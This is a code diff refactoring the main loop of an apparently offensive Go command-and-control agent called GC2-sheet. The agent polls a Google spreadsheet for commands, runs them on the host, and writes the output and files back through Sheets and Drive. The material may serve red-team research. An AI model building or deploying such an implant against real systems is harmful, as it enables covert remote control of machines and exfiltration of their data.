@@ -1,70 +1,65 @@
 package C2
 
 import (
-	"GC2-sheet/internal/authentication"
 	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
 	"time"
 )
 
-func Run() {
+type C2Operations interface {
+	// Retrieve command and ticker from remote spreadsheet
+	pullCommandAndTicker() (string, int)
 
-	// Perform sheet authentication
-	_, clientSheet := authentication.AuthenticateSheet(configuration.GetOptionsCredential())
+	// Push configuration.Commands output to remote spreadsheet
+	pushOutput(*configuration.Commands)
 
-	// Create new configuration
-	spreadSheet := &configuration.SpreadSheet{}
+	// Download a file, returns file content and error if any
+	pullFile(fileId string) ([]byte, error)
 
-	// Set spreadSheet ID
-	spreadSheet.SpreadSheetId = configuration.GetOptionsSheetId()
+	// Local path of the file to push, return error if any
+	pushFile(string) error
 
-	// Set drive ID
-	spreadSheet.DriveId = configuration.GetOptionsDriveId()
+	// Return last command from the Sheet.CommandsExecution pool array
+	getLastCommand() *configuration.Commands
 
-	// Get new sheet name to create
-	newSheetName := generateNewSheetName()
-	// Set sheet name
-	spreadSheet.CommandSheet.Name = newSheetName
+	// Add new *configuration.Commands to the Sheet.CommandsExecution pool array
+	addCommandToPool(*configuration.Commands)
+}
 
-	// Set default ticker duration
-	spreadSheet.CommandSheet.Ticker = 10
+func C2Init() {
 
-	// Set default range for the ticker configuration
-	spreadSheet.CommandSheet.RangeTickerConfiguration = "E2"
+	GAuth := GoogleInit()
 
-	addNewEmptyCommand(spreadSheet)
+	Run(GAuth)
 
-	// Perform drive authentication
-	_, clientDrive := authentication.AuthenticateDrive(configuration.GetOptionsCredential())
+}
 
-	// Creating new sheet inside spreadsheet on program start
-	createSheet(clientSheet, spreadSheet)
+func Run(c2 C2Operations) {
+
+	// Creating the first command
+	c2.addCommandToPool(createEmptyCommand(c2.getLastCommand()))
 
 	// Creating ticker
-	ticker := time.NewTicker(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)
+	ticker := time.NewTicker(time.Duration(configuration.DefaultTickerDuration) * time.Second)
 
 	for {
 		select {
 		case <-ticker.C:
 			go func() {
 				// Get last command in the pool
-				lastCommand := getLastCommand(spreadSheet)
+				lastCommand := c2.getLastCommand()
 
 				commandToExecute := ""
 
 				// If last command has empty Input we need to get the new command from the spreadsheet
 				if lastCommand.Input == "" {
-					// Retrieve last command from the sheet
-					newTicker := 0
 					// command to execute (can be ""), and delay for the ticker
-					commandToExecute, newTicker = readSheet(clientSheet, spreadSheet)
+					newTicker := configuration.DefaultTickerDuration
+					commandToExecute, newTicker = c2.pullCommandAndTicker()
 
 					// Update ticker if value has changed
-					if newTicker != spreadSheet.CommandSheet.Ticker && newTicker != 0 {
-						spreadSheet.CommandSheet.Ticker = newTicker
-						utils.LogDebug("Updated ticker delay")
-						ticker.Reset(time.Duration(spreadSheet.CommandSheet.Ticker) * time.Second)
-					}
+					utils.LogDebug("Updated ticker delay")
+					ticker.Reset(time.Duration(newTicker) * time.Second)
 				}
 
 				// If no command end the thread
@@ -79,13 +74,13 @@ func Run() {
 				lastCommand.Input = commandToExecute
 
 				// Create new empty command before performing the current one (to avoid deadlock on command execution)
-				addNewEmptyCommand(spreadSheet)
+				c2.addCommandToPool(createEmptyCommand(c2.getLastCommand()))
 
 				// Execute the command
-				execute(spreadSheet, clientDrive, lastCommand, commandToExecute)
+				commandExecution(c2, lastCommand)
 
 				// Write result on spreadsheet (result is stored in the current command structure)
-				writeSheet(clientSheet, spreadSheet, lastCommand)
+				c2.pushOutput(lastCommand)
 
 			}()
 		}
@@ -93,28 +88,10 @@ func Run() {
 
 }
 
-// get last command form the command list
-func getLastCommand(spreadSheet *configuration.SpreadSheet) *configuration.Commands {
+func createEmptyCommand(lastCommand *configuration.Commands) *configuration.Commands {
 
-	if len(spreadSheet.CommandSheet.CommandsExecution) == 0 {
-		return nil
-	}
-
-	return &spreadSheet.CommandSheet.CommandsExecution[len(spreadSheet.CommandSheet.CommandsExecution)-1]
-
-}
-
-// create a new empty command and append it to command list
-func addNewEmptyCommand(spreadSheet *configuration.SpreadSheet) {
-
-	lastCommand := getLastCommand(spreadSheet)
-
-	command := configuration.Commands{}
-
-	// if not command, we need to inizializate the first one
 	if lastCommand == nil {
-		// Creating first command
-		command = configuration.Commands{
+		return &configuration.Commands{
 			RangeIn:  "A",
 			RangeOut: "B",
 			RangeLog: "C",
@@ -123,9 +100,7 @@ func addNewEmptyCommand(spreadSheet *configuration.SpreadSheet) {
 			Output:   "",
 		}
 	} else {
-
-		// Creating new empty command
-		command = configuration.Commands{
+		return &configuration.Commands{
 			RangeIn:  "A",
 			RangeOut: "B",
 			RangeLog: "C",
@@ -134,8 +109,4 @@ func addNewEmptyCommand(spreadSheet *configuration.SpreadSheet) {
 			Output:   "",
 		}
 	}
-
-	// Add command to pool
-	spreadSheet.CommandSheet.CommandsExecution = append(spreadSheet.CommandSheet.CommandsExecution, command)
-
 }
